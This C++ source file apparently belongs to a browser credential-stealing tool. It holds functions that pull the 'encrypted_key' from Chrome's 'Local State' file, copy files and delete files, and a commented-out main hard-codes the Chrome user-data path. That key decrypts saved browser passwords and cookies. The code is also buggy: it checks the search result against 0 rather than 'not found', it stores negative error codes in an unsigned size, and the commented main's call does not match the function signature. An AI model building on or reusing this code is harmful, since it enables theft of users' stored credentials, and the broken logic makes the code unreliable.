#include "fileParser.h"

/* 
Parse the json object from inputPath and extract the value of objectValue.

Input path => The path to the input file to get objectValue from (should be in json format)
objectValue => the value we're looking to extract (should always be "encrypted_key" for this project)
output => buffer to hold the content extracted (caller should allocate memory themselves)
size => size of the content parsed
*/
void parseObjectFromJson(string inputPath, string objectValue, LPWSTR output, DWORD* size){
    //buffer is used for getline, strRead holds all buffer read data, result holds the value
    string buffer, strRead, result;
    size_t strLength = objectValue.size();
    int indexOfEncryptedKey = 0;
    
    /* https://www.cplusplus.com/reference/fstream/basic_fstream/ */
    ifstream inputFile;
    inputFile.open(inputPath, ios_base::in);

    if (inputFile.is_open()){
        while (getline(inputFile, buffer) ){
            // since we're only using it on local stat with one json object for "browser"
            // we shouldn't be getting any new lines 
            strRead.append(buffer);
        }

        indexOfEncryptedKey = strRead.find(objectValue);
        if(indexOfEncryptedKey != 0){
            indexOfEncryptedKey += (strLength + 3);
            string temp = strRead.substr(indexOfEncryptedKey);
            int indexOfEnd = temp.find("\"");

            if(output == NULL){
                *size = indexOfEnd+1;
            }else{
                result = temp.substr(0, indexOfEnd);
                LPCSTR charBuffer = result.c_str();
                //here we're assuming the user already allocated memory for buffer called output
                mbstowcs(output, charBuffer, indexOfEnd+1);
            }
        }else{
            wprintf(L"Object not found\n");
            *size = -1337;
        }
    }else{
        wprintf(L"Failed to open file\n");
        *size = -1337;
    }
    inputFile.close();
}

/*
Copy file to another file

inputPath => file to copy from
outputPath => file to copy to
*/
int copyContentToFile(string inputPath, string outputPath){
    ifstream inputFile;
    ofstream outputFile;

    inputFile.open(inputPath, ios_base::binary);
    outputFile.open(outputPath, ios_base::binary);
    if(inputFile.is_open() && outputFile.is_open()){
        outputFile << inputFile.rdbuf();
    }else{
        wprintf(L"Failed to open streams\n");
        return -1337;
    }
    inputFile.close();
    outputFile.close();

    return 0;
}

/* 
Deletes a file passed to the function
*/
int deleteFile(const char* filePath){
    int result = remove(filePath);
    if(result != 0){
        wprintf(L"*** ERROR REMOVING A FILE");
        return -1337;
    }
    return 0;
}
/*
int wmain(int argc, char** argv){
    if(argc != 3){
        wprintf(L"Correct usage: [file to read from] [file to output to]\n");
        return 1;
    }
    ofstream outputFile;
    string inputPath = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    
    wprintf(L"String read: %s\n", parseObjectFromJson(inputPath, "encrypted_key").c_str());
    return 0;
}   
*/